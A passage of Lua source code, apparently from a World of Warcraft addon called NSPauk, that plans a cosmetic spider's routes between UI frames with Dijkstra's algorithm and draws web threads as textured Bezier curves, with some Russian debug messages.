                addEdge(prevId, id, math.sqrt(dx * dx + dy * dy), "web")
            end

            addEdgeProjection(id)
            prevId = id
        end

        threads[wi].nodeIds = ids
    end

    local supportCount = #nodes

    for i = 1, supportCount do
        local ni = nodes[i]

        if ni.kind == "frame" or ni.kind == "web" then
            for j = i + 1, supportCount do
                local nj = nodes[j]

                if nj.kind == "frame" or nj.kind == "web" then
                    local same = false

                    if ni.kind == "frame" and nj.kind == "frame" and ni.frameId == nj.frameId then
                        same = true
                    end

                    if ni.kind == "web" and nj.kind == "web" and ni.webId == nj.webId then
                        same = true
                    end

                    if not same then
                        local dx = ni.x - nj.x
                        local dy = ni.y - nj.y
                        local d2 = dx * dx + dy * dy

                        if d2 <= gap * gap then
                            addEdge(i, j, math.sqrt(d2), "gap")
                        end
                    end
                end
            end
        end
    end

    local sides = { bottom = {}, top = {}, left = {}, right = {} }

    for i, n in ipairs(nodes) do
        if n.kind == "edge" and n.edgeSide and sides[n.edgeSide] then
            table.insert(sides[n.edgeSide], i)
        end
    end

    local function connectSide(list, useX)
        table.sort(list, function(a, b)
            if useX then
                if nodes[a].x == nodes[b].x then
                    return nodes[a].y < nodes[b].y
                end

                return nodes[a].x < nodes[b].x
            else
                if nodes[a].y == nodes[b].y then
                    return nodes[a].x < nodes[b].x
                end

                return nodes[a].y < nodes[b].y
            end
        end)

        for k = 1, #list - 1 do
            local a = list[k]
            local b = list[k + 1]
            local dx = nodes[a].x - nodes[b].x
            local dy = nodes[a].y - nodes[b].y

            addEdge(a, b, math.sqrt(dx * dx + dy * dy), "edge")
        end
    end

    connectSide(sides.bottom, true)
    connectSide(sides.top, true)
    connectSide(sides.left, false)
    connectSide(sides.right, false)

    for i = 1, #nodes do
        if nodes[i].kind == "edge" then
            for j = i + 1, #nodes do
                if nodes[j].kind == "edge" then
                    local dx = nodes[i].x - nodes[j].x
                    local dy = nodes[i].y - nodes[j].y
                    local d2 = dx * dx + dy * dy

                    if d2 <= gap * gap then
                        addEdge(i, j, math.sqrt(d2), "edge")
                    end
                end
            end
        end
    end

    local startIdx = addNode({ x = from.x, y = from.y, kind = "start" })
    local targetIdx = addNode({ x = to.x, y = to.y, kind = "target" })

    local topX = to.x
    if topX < 0 then
        topX = 0
    elseif topX > sw then
        topX = sw
    end

    local topIdx = addNode({ x = topX, y = sh, kind = "edge", edgeSide = "top" })

    for i, n in ipairs(nodes) do
        if i ~= topIdx and n.kind == "edge" and n.edgeSide == "top" then
            addEdge(topIdx, i, math.abs(n.x - topX), "edge")
        end
    end

    local function connectPoint(idx, point)
        for fi, rect in ipairs(frames) do
            local inside = point.x >= rect.left - 1
                and point.x <= rect.right + 1
                and point.y >= rect.bottom - 1
                and point.y <= rect.top + 1

            if inside and rect.nodeIds then
                for _, nid in ipairs(rect.nodeIds) do
                    local n = nodes[nid]
                    local dx = point.x - n.x
                    local dy = point.y - n.y

                    addEdge(idx, nid, math.sqrt(dx * dx + dy * dy), "frame")
                end
            elseif rect.nodeIds then
                for _, nid in ipairs(rect.nodeIds) do
                    local n = nodes[nid]
                    local dx = point.x - n.x
                    local dy = point.y - n.y
                    local d2 = dx * dx + dy * dy

                    if d2 <= gap * gap then
                        addEdge(idx, nid, math.sqrt(d2), "gap")
                    end
                end
            end
        end

        local webPickGap = gap * 1.25

        for wi, info in ipairs(threads) do
            if info.nodeIds then
                for _, nid in ipairs(info.nodeIds) do
                    local n = nodes[nid]
                    local dx = point.x - n.x
                    local dy = point.y - n.y
                    local d2 = dx * dx + dy * dy

                    if d2 <= webPickGap * webPickGap then
                        addEdge(idx, nid, math.sqrt(d2), "web")
                    end
                end
            end
        end

        local function connectEdgeProj(side, px, py, weight)
            local eid = addNode({ x = px, y = py, kind = "edge", edgeSide = side })
            addEdge(idx, eid, weight, "edge")

            for i, n in ipairs(nodes) do
                if i ~= eid and n.kind == "edge" and n.edgeSide == side then
                    local d

                    if side == "bottom" or side == "top" then
                        d = math.abs(px - n.x)
                    else
                        d = math.abs(py - n.y)
                    end

                    addEdge(eid, i, d, "edge")
                end
            end
        end

        if point.x <= gap then
            connectEdgeProj("left", 0, point.y, point.x)
        end

        if point.x >= sw - gap then
            connectEdgeProj("right", sw, point.y, sw - point.x)
        end

        if point.y <= gap then
            connectEdgeProj("bottom", point.x, 0, point.y)
        end

        if point.y >= sh - gap then
            connectEdgeProj("top", point.x, sh, sh - point.y)
        end
    end

    connectPoint(startIdx, from)
    connectPoint(targetIdx, to)

    local distArr, prev = self:NP_Dijkstra(startIdx, nodes, edges)

    local directPath = nil
    local directLen = nil

    if distArr[targetIdx] and distArr[targetIdx] < math.huge then
        directLen = distArr[targetIdx]
        directPath = self:NP_ReconstructPath(prev, startIdx, targetIdx, nodes)
    end

    local topPath = nil
    local topLen = nil

    if distArr[topIdx] and distArr[topIdx] < math.huge then
        topLen = distArr[topIdx]
        topPath = self:NP_ReconstructPath(prev, startIdx, topIdx, nodes)
    end

    local fallbackLen = nil

    if topLen and topPath then
        fallbackLen = topLen + math.abs(sh - to.y)
    end

    local function actualLen(pts)
        local total = 0

        for i = 1, #pts - 1 do
            local dx = pts[i].x - pts[i + 1].x
            local dy = pts[i].y - pts[i + 1].y
            total = total + math.sqrt(dx * dx + dy * dy)
        end

        return total
    end

    local route = nil

    if directPath and fallbackLen and directLen <= fallbackLen then
        route = {
            points = directPath,
            length = actualLen(directPath),
            kind = "direct",
        }
    elseif topPath then
        route = {
            points = topPath,
            length = actualLen(topPath) + math.abs(sh - to.y),
            kind = "drop",
            dropToTarget = true,
            dropFrom = { x = topX, y = sh },
        }
    elseif directPath then
        route = {
            points = directPath,
            length = actualLen(directPath),
            kind = "direct",
        }
    end

    if route then
        local fromSup = self:NP_FindSupportAt(from.x, from.y)
        local toSup = self:NP_FindSupportAt(to.x, to.y)

        S.nspLastRoute = {
            fromName = self:NP_SupportDescription(fromSup),
            toName = self:NP_SupportDescription(toSup),
            count = route.points and #route.points or 0,
            length = route.length or 0,
            kind = route.kind or "?",
        }
    end

    return route
end

function NSPauk:NP_MakePlanTask(kind, from, to, conn, owner)
    return {
        kind = (kind == "thread") and "thread" or "travel",
        nspPlan = true,
        drop = false,
        p0 = copyPoint(from),
        p1 = { x = (from.x + to.x) / 2, y = (from.y + to.y) / 2 },
        p2 = copyPoint(to),
        conn = conn,
        owner = owner,
        nspNoInsert = true,
    }
end

function NSPauk:NP_CopyPlanTask(task)
    local copy = {}

    for k, v in pairs(task) do
        copy[k] = v
    end

    copy.nspAttempts = (task.nspAttempts or 0) + 1
    copy.p0 = task.p0 and copyPoint(task.p0) or nil
    copy.p1 = task.p1 and copyPoint(task.p1) or nil
    copy.p2 = task.p2 and copyPoint(task.p2) or nil

    return copy
end

function NSPauk:NP_MakeFallTask(from, to)
    local fromC = { x = from.x or 0, y = from.y or 0 }
    local toY = tonumber(to and to.y) or 0

    if toY > fromC.y - 1 then
        toY = math.max(0, fromC.y - 1)
    end

    local toC = { x = fromC.x, y = toY }

    return {
        kind = "travel",
        nspFall = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = { x = fromC.x, y = fromC.y },
        p1 = { x = fromC.x, y = (fromC.y + toC.y) / 2 },
        p2 = { x = toC.x, y = toC.y },
    }
end

function NSPauk:NP_MakeTempDropTask(from, to)
    return self:NP_MakeFallTask(from, to)
end

function NSPauk:NP_MakeStartDragTask(plan, anchor)
    local finalThread = plan.finalThread

    if not finalThread then
        finalThread = {
            p0 = copyPoint(anchor),
            p1 = copyPoint(plan.p1),
            p2 = copyPoint(plan.p2),
        }
    end

    return {
        kind = "travel",
        nspStartDragTask = true,
        nspDuringDrag = true,
        nspNoInsert = true,
        nspNoSupportCheck = true,
        drop = false,
        p0 = { x = anchor.x or 0, y = anchor.y or 0 },
        p1 = { x = anchor.x or 0, y = anchor.y or 0 },
        p2 = { x = anchor.x or 0, y = anchor.y or 0 },
        owner = plan.owner,
        conn = plan.conn,
        finalThread = finalThread,
        isCross = plan.isCross,
        isMain = plan.isMain,
    }
end

function NSPauk:NP_InvalidateRouteCaches(thread, owner)
    local S = self.S

    if thread then
        thread._nspMapSamples = nil
        thread._nspMapTexCount = nil
        thread._nspColPts = nil
        thread._nspColIgnore = nil
    end

    if owner and owner.thread then
        owner.thread._nspMapSamples = nil
        owner.thread._nspMapTexCount = nil
        owner.thread._nspColPts = nil
        owner.thread._nspColIgnore = nil
    end

    S.nspSupportCache = nil
    S.nspNearCache = nil

end

function NSPauk:NP_DropPermanentThread(owner, thread)
    if not owner or not owner.alive or not thread then
        return
    end

    if not owner.textures then
        owner.textures = {}
    end

    local th = thread

    if not th.p1 then
        th = {
            p0 = th.p0,
            p1 = { x = (th.p0.x + th.p2.x) / 2, y = (th.p0.y + th.p2.y) / 2 },
            p2 = th.p2,
        }
    end

    local total = self:ApproxThreadLength(th)

    if total <= 0 then
        return
    end

    local spacing = self:GetWebPointSpacing()
    local count = math.floor(total / spacing) + 1

    if count < 2 then
        count = 2
    end

    local hard = math.max(tonumber(self.C.MAX_DROPS_PER_FRAME) or 140, 1000)

    if count > hard then
        count = hard
    end

    local dropTask = { owner = owner, drop = true }

    for i = 0, count - 1 do
        local t = i / (count - 1)
        local x, y = self:BzThread(th, t)
        self:DropWebForTask(dropTask, x, y)
    end

    self:NP_InvalidateRouteCaches(thread, owner)
end

function NSPauk:NP_StartDrag(task)
    local S = self.S

    if S.nspDrag and S.nspDrag.owner == task.owner then
        return
    end

    if S.nspDrag then
        self:NP_ClearGlobalDrag(false)
    end

    local finalThread = task.finalThread

    if not finalThread then
        finalThread = {
            p0 = copyPoint(task.p0),
            p1 = copyPoint(task.p1),
            p2 = copyPoint(task.p2),
        }
    end

    S.nspDrag = {
        anchor = copyPoint(task.p0),
        owner = task.owner,
        finalThread = finalThread,
        textures = {},
        temp = false,
    }
end

function NSPauk:NP_ClearGlobalDrag(fade)
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    local list = drag.textures or {}

    if fade and #list > 0 then
        self:AddFade(list, self.C.TEAR_FADE_DURATION or 1.5, nil)
    else
        self:RecycleTextures(list)
    end

    S.nspDrag = nil
end

function NSPauk:NP_FinishGlobalDrag(task)
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    local thread = drag.finalThread
    local owner = drag.owner

    if drag.owner and drag.owner.alive and drag.finalThread then
        self:NP_DropPermanentThread(drag.owner, drag.finalThread)
    end

    self:NP_ClearGlobalDrag(false)

    if self.CheckPointLimit then
        self:CheckPointLimit()
    end

    self:NP_InvalidateRouteCaches(thread, owner)
end

function NSPauk:NP_UpdateDragTextures(list, anchor, current, vertical)
    local S = self.S
    local C = self.C

    if not list or not anchor or not current then
        return
    end

    if not S.activeFrame then
        return
    end

    local dx = current.x - anchor.x
    local dy = current.y - anchor.y
    local len = math.sqrt(dx * dx + dy * dy)

    if len < 1 then
        for i = 1, #list do
            list[i]:Hide()
        end

        return
    end

    local webSize = tonumber(C.WEB_SIZE) or 2
    local alpha = tonumber(C.WEB_ALPHA) or 0.55

    local step = math.max(1, webSize * 0.65)
    local count = math.floor(len / step) + 1

    if count < 2 then
        count = 2
    end

    local cap = vertical and 700 or 2200

    if count > cap then
        count = cap
    end

    while #list < count do
        local tex

        if #S.webPool > 0 then
            tex = table.remove(S.webPool)

            if tex then
                tex._nspInPool = false
            end
        else
            tex = S.activeFrame:CreateTexture(nil, "OVERLAY")

            if tex then
                S.webCreated = (S.webCreated or 0) + 1
            end
        end

        if not tex then
            count = #list
            break
        end

        tex:SetTexture(C.TEX_WEB)
        tex:SetDrawLayer("OVERLAY")
        tex:SetVertexColor(1, 1, 1, 1)
        tex:SetWidth(webSize)
        tex:SetHeight(webSize)

        list[#list + 1] = tex
    end

    if count < 2 then
        for i = 1, #list do
            list[i]:Hide()
        end

        return
    end

    local actualStep = len / (count - 1)
    local drawSize = math.max(webSize, actualStep * 1.35)

    local p1

    if vertical then
        p1 = { x = anchor.x, y = (anchor.y + current.y) / 2 }
    else
        local sag = len * 0.10

        if sag < 2 then
            sag = 2
        end

        p1 = {
            x = (anchor.x + current.x) / 2,
            y = (anchor.y + current.y) / 2 - sag,
        }
    end

    for i = 1, #list do
        local tex = list[i]

        if i <= count then
            local t = (i - 1) / (count - 1)
            local x = self:Bz(t, anchor.x, p1.x, current.x)
            local y = self:Bz(t, anchor.y, p1.y, current.y)

            tex:ClearAllPoints()
            tex:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
            tex:SetWidth(drawSize)
            tex:SetHeight(drawSize)
            tex:SetAlpha(alpha)
            tex:Show()
        else
            tex:Hide()
        end
    end
end

function NSPauk:NP_UpdateGlobalDrag()
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    if drag.owner and not drag.owner.alive then
        self:NP_ClearGlobalDrag(true)
        return
    end

    self:NP_UpdateDragTextures(
        drag.textures,
        drag.anchor,
        { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 },
        false
    )
end

function NSPauk:NP_UpdateTempDrag(task)
    local S = self.S

    if not task then
        return
    end

    if not task.nspDragTextures then
        task.nspDragTextures = {}
    end

    self:NP_UpdateDragTextures(
        task.nspDragTextures,
        task.p0,
        { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 },
        true
    )
end

function NSPauk:NP_FinishTempDrag(task)
    if not task then
        return
    end

    if task.nspDragTextures and #task.nspDragTextures > 0 then
        self:AddFade(task.nspDragTextures, self.C.TEAR_FADE_DURATION or 2, nil)
    end

    task.nspDragTextures = {}
end

function NSPauk:NP_RecycleTempDrag(task)
    if not task then
        return
    end

    if task.nspDragTextures then
        self:RecycleTextures(task.nspDragTextures)
    end

    task.nspDragTextures = {}
end

function NSPauk:NP_ClearTempOwners()
    local S = self.S

    if not S.nspTempOwners then
        S.nspTempOwners = {}
    end

    for _, owner in ipairs(S.nspTempOwners) do
        owner.alive = false
    end

    S.nspTempOwners = {}
end

function NSPauk:NP_FreshHasSupportAt(x, y)
    local gap = self:NP_GetGap()
    local sw, sh = self:GetScreenSize()
    local rects = self:NP_EnsureFrameCache()

    for _, r in ipairs(rects) do
        if r.frame then
            local cur = self:ComputeFrameVisibleInner(r.frame)

            if cur
                and x >= cur.left - 1
                and x <= cur.right + 1
                and y >= cur.bottom - 1
                and y <= cur.top + 1 then
                return true
            end
        end
    end

    local checked = 0
    local found = false

    local function checkThread(thread, owner)
        if not thread or not thread.p0 or not thread.p2 then
            return false
        end

        if not owner or not owner.textures or #owner.textures == 0 then
            return false
        end

        if self:ThreadNearMouse(thread, x, y, gap) then
            local d = self:DistToThread(thread, x, y)

            if d <= gap * 0.75 then
                return true
            end
        end

        return false
    end

    for _, inst in ipairs(self.S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    checked = checked + 1

                    if checkThread(conn.thread, conn) then
                        found = true
                        break
                    end
                end
            end
        end

        if found then
            break
        end

        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    checked = checked + 1

                    if checkThread(seg.thread, seg) then
                        found = true
                        break
                    end
                end
            end
        end

        if found or checked >= 80 then
            break
        end
    end

    if found then
        return true
    end

    if x <= gap or x >= sw - gap or y <= gap or y >= sh - gap then
        return true
    end

    return false
end

function NSPauk:NP_NearSupportWithin(x, y, tol)
    local S = self.S

    if type(tol) ~= "number" or tol ~= tol or tol < 0 then
        tol = self:NP_GetGap()
    end

    local now = GetTime()

    local rx = math.floor((x or 0) / 3 + 0.5)
    local ry = math.floor((y or 0) / 3 + 0.5)
    local rt = math.floor(tol + 0.5)

    local cache = S.nspNearCache

    if cache
        and now - (cache.t or 0) < 0.10
        and cache.x == rx
        and cache.y == ry
        and cache.tol == rt then
        return cache.ok
    end

    local ok = false
    local sw, sh = self:GetScreenSize()
    local gap = self:NP_GetGap()
    local edgeTol = math.min(tol, gap)

    if x <= edgeTol or x >= sw - edgeTol or y <= edgeTol or y >= sh - edgeTol then
        ok = true
    end

    if not ok then
        local rects = self:NP_EnsureFrameCache()

        for _, r in ipairs(rects) do
            if r.frame then
                local cur = self:ComputeFrameVisibleInner(r.frame)

                if cur
                    and x >= cur.left - tol
                    and x <= cur.right + tol
                    and y >= cur.bottom - tol
                    and y <= cur.top + tol then
                    ok = true
                    break
                end
            end
        end
    end

    if not ok then
        local checked = 0
        local found = false

        local function checkThread(thread, owner)
            if not thread or not thread.p0 or not thread.p2 then
                return false
            end

            if not owner or not owner.textures or #owner.textures == 0 then
                return false
            end

            if self:ThreadNearMouse(thread, x, y, tol) then
                local d = self:DistToThread(thread, x, y)

                if d <= tol then
                    return true
                end
            end

            return false
        end

        for _, inst in ipairs(S.instances) do
            if inst.conns then
                for _, conn in ipairs(inst.conns) do
                    if conn.alive and conn.thread then
                        checked = checked + 1

                        if checkThread(conn.thread, conn) then
                            found = true
                            break
                        end
                    end
                end
            end

            if found then
                break
            end

            if inst.crossSegs then
                for _, seg in ipairs(inst.crossSegs) do
                    if seg.alive and seg.thread then
                        checked = checked + 1

                        if checkThread(seg.thread, seg) then
                            found = true
                            break
                        end
                    end
                end
            end

            if found or checked >= 80 then
                break
            end
        end

        if found then
            ok = true
        end
    end

    S.nspNearCache = {
        t = now,
        x = rx,
        y = ry,
        tol = rt,
        ok = ok,
    }

    return ok
end

function NSPauk:NP_PostUpdate()
    local S = self.S

    if S.phase == "task" then
        local task = S.currentTask

        if task then
            if S.nspDrag and task.nspDuringDrag then
                self:NP_UpdateGlobalDrag()
            end

            if task.nspTempThread then
                self:NP_UpdateTempDrag(task)
            end
        end
    else
        if S.nspDrag and S.phase ~= "instanceComplete" and S.phase ~= "limitWait" then
            self:NP_ClearGlobalDrag(true)
        end
    end
end

function NSPauk:NP_DebugPrint()
    local S = self.S

    self:Print("NSPauk debug:")
    self:Print(string.format("Фаза: %s, режим: %s", tostring(S.phase), tostring(S.mode)))
    self:Print(string.format("Паук: %.1f, %.1f", S.lastSpiderX or 0, S.lastSpiderY or 0))

    local sup = self:NP_FindSupportAt(S.lastSpiderX or 0, S.lastSpiderY or 0)
    self:Print("Опора: " .. self:NP_SupportDescription(sup))

    local task = S.currentTask

    if task then
        local kind = "обычная"

        if task.nspPlan then
            kind = "plan"
        elseif task.nspTempThread then
            kind = "tempdrop"
        elseif task.nspFall then
            kind = "fall"
        elseif task.nspCrawl then
            kind = "crawl"
        elseif task.kind then
            kind = tostring(task.kind)
        end

        self:Print(string.format(
            "Задача: %s, drop=%s, drag=%s, end=%s, t=%.2f",
            kind,
            tostring(task.drop),
            tostring(task.nspDuringDrag),
            tostring(task.nspDragEnd),
            S.moveT or 0
        ))

        if task.p0 and task.p2 then
            self:Print(string.format(
                "  от %.1f,%.1f к %.1f,%.1f",
                task.p0.x or 0,
                task.p0.y or 0,
                task.p2.x or 0,
                task.p2.y or 0
            ))
        end
    else
        self:Print("Задача: нет")
    end

    if S.nspLastRoute then
        local r = S.nspLastRoute

        self:Print(string.format(
            "Маршрут: от %s к %s, точек %d, длина %.0f, тип %s",
            tostring(r.fromName or "?"),
            tostring(r.toName or "?"),
            r.count or 0,
            r.length or 0,
            tostring(r.kind or "?")
        ))
    else
        self:Print("Маршрут: нет")
    end

    if S.nspDrag and S.nspDrag.anchor then
        self:Print(string.format(
            "Тянем нить от %.1f,%.1f",
            S.nspDrag.anchor.x or 0,
            S.nspDrag.anchor.y or 0
        ))
    end
end

function NSPauk:AddTravelPointTask(tasks, from, to, conn, owner)
    if not from or not to then
        return nil
    end

    local dx = to.x - from.x
    local dy = to.y - from.y

    if (dx * dx + dy * dy) < 36 then
        return nil
    end

    local inst = self:GetOwnerInstance(owner)

    if not inst and conn then
        inst = self:GetOwnerInstance(conn)
    end

    ---------------------------------------------------------------------------
    -- Для кокона отключаем маршрутизацию полностью.
    ---------------------------------------------------------------------------
    if inst and inst.isCocoon then
        local task = {
            kind = "travel",
            conn = conn,
            owner = owner,
            drop = false,
            p0 = { x = from.x, y = from.y },
            p1 = { x = (from.x + to.x) / 2, y = (from.y + to.y) / 2 },
            p2 = { x = to.x, y = to.y },
            nspNoInsert = true,
            nspNoSupportCheck = true,
        }

        tasks[#tasks + 1] = task
        return task
    end

    ---------------------------------------------------------------------------
    -- Обычная паутина продолжает использовать маршрутизацию.
    ---------------------------------------------------------------------------
    local task = {
        kind = "travel",
        conn = conn,
        owner = owner,
        drop = false,
        p0 = { x = from.x, y = from.y },
        p1 = { x = (from.x + to.x) / 2, y = (from.y + to.y) / 2 },
        p2 = { x = to.x, y = to.y },
        nspPlan = true,
        nspNoInsert = true,
    }

    tasks[#tasks + 1] = task
    return task
end

function NSPauk:AddTravelThreadTask(tasks, conn, tA, tB, owner)
    if not conn or not conn.thread then
        return nil
    end

    if math.abs(tB - tA) < 0.005 then
        return nil
    end

    local ax, ay = self:BzThread(conn.thread, tA)
    local bx, by = self:BzThread(conn.thread, tB)
    local mx, my = self:BzThread(conn.thread, (tA + tB) / 2)

    local task = {
        kind = "travel",
        conn = conn,
        owner = owner,
        drop = false,
        p0 = { x = ax, y = ay },
        p1 = { x = mx, y = my },
        p2 = { x = bx, y = by },
        nspCrawl = true,
        nspAlongWeb = true,
        nspNoSupportCheck = true,
    }

    tasks[#tasks + 1] = task

    return task
end

function NSPauk:AddThreadTask(tasks, owner, thread)
    if not owner or not thread then
        return nil
    end

    local inst = self:GetOwnerInstance(owner)

    ---------------------------------------------------------------------------
    -- Для кокона отключаем маршрутизацию и динамическое перетаскивание.
    ---------------------------------------------------------------------------
    if inst and inst.isCocoon then
        local task = {
            kind = "thread",
            owner = owner,
            drop = true,
            p0 = thread.p0,
            p1 = thread.p1 or {
                x = (thread.p0.x + thread.p2.x) / 2,
                y = (thread.p0.y + thread.p2.y) / 2,
            },
            p2 = thread.p2,
            isCross = owner.connA ~= nil,
            nspNoInsert = true,
            nspNoSupportCheck = true,
        }

        tasks[#tasks + 1] = task
        return task
    end

    ---------------------------------------------------------------------------
    -- Обычная паутина продолжает использовать nspPlan / nspDrag.
    ---------------------------------------------------------------------------
    local task = {
        kind = "thread",
        owner = owner,
        drop = false,
        p0 = thread.p0,
        p1 = thread.p1,
        p2 = thread.p2,
        nspPlan = true,
        nspDrag = true,
        nspNoInsert = true,
    }

    task.isCross = owner.connA ~= nil

    task.finalThread = {
        p0 = { x = thread.p0.x, y = thread.p0.y },
        p1 = thread.p1 and { x = thread.p1.x, y = thread.p1.y } or {
            x = (thread.p0.x + thread.p2.x) / 2,
            y = (thread.p0.y + thread.p2.y) / 2,
        },
        p2 = { x = thread.p2.x, y = thread.p2.y },
    }

    if thread.ownerRef then
        task.finalThread.ownerRef = thread.ownerRef
    end

    tasks[#tasks + 1] = task
    return task
end

function NSPauk:AddArcRowTasks(tasks, inst, cursor, arcLen, rowIdx)
    local C = self.C
    local N = #inst.conns

    if N < 2 then
        return
    end

    if not inst.crossRowsList then
        inst.crossRowsList = {}
    end

    if not rowIdx then
        rowIdx = #inst.crossRowsList + 1
    end

    local rowSegs = inst.crossRowsList[rowIdx] or {}

    local spacing = C.CROSS_ROW_SPACING

    if not spacing or spacing < 0.5 then
        spacing = 0.5
    end

    local eps = spacing * 0.5

    local function getPoint(conn, len)
        local total = conn.arcLength or 0

        if total <= 0 then
            return nil
        end

        local target = len

        if target > total then
            target = total
        end

        local t = self:ThreadTAtLength(conn, target)

        if not t then
            return nil
        end

        local x, y = self:BzThread(conn.thread, t)

        return t, x, y
    end

    local function moveTo(connA, idxA, tA, ax, ay, owner)
        if cursor.idx == idxA and cursor.t then
            if math.abs(tA - cursor.t) > 0.001 then
                self:AddTravelThreadTask(tasks, connA, cursor.t, tA, owner)
            end
        else
            self:AddTravelPointTask(tasks, cursor.point, { x = ax, y = ay }, connA, owner)
        end

        cursor.idx = idxA
        cursor.t = tA
        cursor.point = { x = ax, y = ay }
    end

    if N == 2 then
        if inst.sectorAllowed and inst.sectorAllowed[1] == false then
            inst.crossRowsList[rowIdx] = rowSegs
            return
        end

        local aIdx = cursor.idx

        if aIdx ~= 1 and aIdx ~= 2 then
            aIdx = 1
        end

        local bIdx = (aIdx % 2) + 1

        local connA = inst.conns[aIdx]
        local connB = inst.conns[bIdx]

        local pairMin = math.min(connA.arcLength or 0, connB.arcLength or 0)

        if arcLen <= pairMin + eps then
            local tA, ax, ay = getPoint(connA, arcLen)
            local tB, bx, by = getPoint(connB, arcLen)

            if tA and tB then
                local dx = bx - ax
                local dy = by - ay
                local minLen = C.MIN_CROSS_LEN

                if (dx * dx + dy * dy) >= (minLen * minLen) then
                    local seg = self:CreateCrossSegArc(inst, connA, connB, tA, tB, minLen)

                    if seg then
                        moveTo(connA, aIdx, tA, ax, ay, seg)
                        self:AddThreadTask(tasks, seg, seg.thread)

                        rowSegs[1] = seg

                        cursor.idx = bIdx
                        cursor.t = tB
                        cursor.point = { x = bx, y = by }
                    end
                end
            end
        end

        inst.crossRowsList[rowIdx] = rowSegs

        return
    end

    for i = 1, N do
        local skip = inst.sectorAllowed and inst.sectorAllowed[i] == false

        if not skip then
            local aIdx = i
            local bIdx = (i % N) + 1

            local connA = inst.conns[aIdx]
            local connB = inst.conns[bIdx]

            local pairMin = math.min(connA.arcLength or 0, connB.arcLength or 0)

            if arcLen <= pairMin + eps then
                local tA, ax, ay = getPoint(connA, arcLen)
                local tB, bx, by = getPoint(connB, arcLen)

                if tA and tB then
                    local dx = bx - ax
                    local dy = by - ay
                    local minLen = C.MIN_CROSS_LEN

                    if i == N and minLen > 1 then
                        minLen = math.max(1, minLen * 0.5)
                    end

                    if (dx * dx + dy * dy) >= (minLen * minLen) then
                        local seg = self:CreateCrossSegArc(inst, connA, connB, tA, tB, minLen)

                        if seg then
                            moveTo(connA, aIdx, tA, ax, ay, seg)
                            self:AddThreadTask(tasks, seg, seg.thread)

                            rowSegs[aIdx] = seg

                            cursor.idx = bIdx
                            cursor.t = tB
                            cursor.point = { x = bx, y = by }
                        end
                    end
                end
            end
        end
    end

    inst.crossRowsList[rowIdx] = rowSegs
end

function NSPauk:AddInterCrossTasks(tasks, inst, cursor)
    local C = self.C

    if not inst or not inst.crossRowsList then
        return
    end

    local rowsList = inst.crossRowsList
    local rowCount = #rowsList

    if rowCount < 2 then
        return
    end

    if not inst.interSegs then
        inst.interSegs = {}
    end

    local N = #inst.conns

    if N < 2 then
        return
    end

    local spacing = C.INTERCROSS_SPACING or C.CROSS_ROW_SPACING

    if not spacing or spacing < 1 then
        spacing = 1
    end

    local maxTotal = C.MAX_INTERCROSS_SEGS or 0
    local maxPerPair = C.MAX_INTERCROSS_PER_PAIR or 60

    local made = 0
    local done = false

    local indices = {}

    if N == 2 then
        indices[1] = 1
    else
        for i = 1, N do
            indices[#indices + 1] = i
        end
    end

    local minD2 = C.MIN_CROSS_LEN * C.MIN_CROSS_LEN

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    for r = 1, rowCount - 1 do
        if done then
            break
        end

        local rowA = rowsList[r]
        local rowB = rowsList[r + 1]

        if rowA and rowB then
            for _, idx in ipairs(indices) do
                if done then
                    break
                end

                local segA = rowA[idx]
                local segB = rowB[idx]

                if segA and segB and segA.alive and segB.alive and segA.thread and segB.thread then
                    local lenA = self:ApproxThreadLength(segA.thread)
                    local lenB = self:ApproxThreadLength(segB.thread)
                    local len = math.min(lenA, lenB)

                    local count = math.floor(len / spacing)

                    if count > maxPerPair then
                        count = maxPerPair
                    end

                    if count >= 2 then
                        for k = 1, count - 1 do
                            if maxTotal > 0 and made >= maxTotal then
                                done = true
                                break
                            end

                            local f = k / count

                            local ax, ay = self:BzThread(segA.thread, f)
                            local bx, by = self:BzThread(segB.thread, f)

                            local dx = bx - ax
                            local dy = by - ay

                            if (dx * dx + dy * dy) >= minD2 then
                                local thread = {
                                    p0 = { x = ax, y = ay },
                                    p2 = { x = bx, y = by },
                                }

                                self:MakeSag(thread, "inter", hubX, hubY)

                                local inter = {
                                    connA = segA.connA,
                                    connB = segA.connB,
                                    parentSegA = segA,
                                    parentSegB = segB,
                                    thread = thread,
                                    textures = {},
                                    alive = true,
                                    isInterCross = true,
                                    t = f,
                                }

                                thread.ownerRef = {
                                    inst = inst,
                                    seg = inter,
                                }

                                inst.crossSegs[#inst.crossSegs + 1] = inter
                                inst.interSegs[#inst.interSegs + 1] = inter

                                if cursor and cursor.point then
                                    self:AddTravelPointTask(tasks, cursor.point, thread.p0, segA.connA, inter)
                                end

                                self:AddThreadTask(tasks, inter, thread)

                                if not cursor then
                                    cursor = {}
                                end

                                cursor.point = { x = thread.p2.x, y = thread.p2.y }

                                made = made + 1
                            end
                        end
                    end
                end
            end
        end
    end
end

function NSPauk:MakeTopDownDrawThread(thread, cursorPoint)
    if not thread or not thread.p0 or not thread.p2 then
        return nil
    end

    local p0 = thread.p0
    local p2 = thread.p2

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
        y = (p0.y + p2.y) / 2,
    }

    local reverse = false
    local yTol = 0.01

    if p0.y < p2.y - yTol then
        reverse = true
    elseif math.abs(p0.y - p2.y) <= yTol and cursorPoint then
        local d0x = p0.x - cursorPoint.x
        local d0y = p0.y - cursorPoint.y
        local d0 = d0x * d0x + d0y * d0y

        local d2x = p2.x - cursorPoint.x
        local d2y = p2.y - cursorPoint.y
        local d2 = d2x * d2x + d2y * d2y

        if d2 < d0 then
            reverse = true
        end
    end

    local drawThread

    if reverse then
        drawThread = {
            p0 = { x = p2.x, y = p2.y },
            p1 = { x = p1.x, y = p1.y },
            p2 = { x = p0.x, y = p0.y },
        }
    else
        drawThread = {
            p0 = { x = p0.x, y = p0.y },
            p1 = { x = p1.x, y = p1.y },
